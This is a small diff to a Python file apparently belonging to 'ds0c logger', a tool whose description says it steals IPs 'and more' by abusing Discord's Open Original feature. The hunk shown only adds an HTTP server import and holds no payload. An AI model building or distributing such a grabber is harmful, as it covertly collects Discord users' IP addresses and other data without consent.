@@ -6,6 +6,8 @@ import json
 import urllib.parse
 from datetime import datetime
 import traceback
+from http.server import BaseHTTPRequestHandler
+
 
 __app__ = "ds0c logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
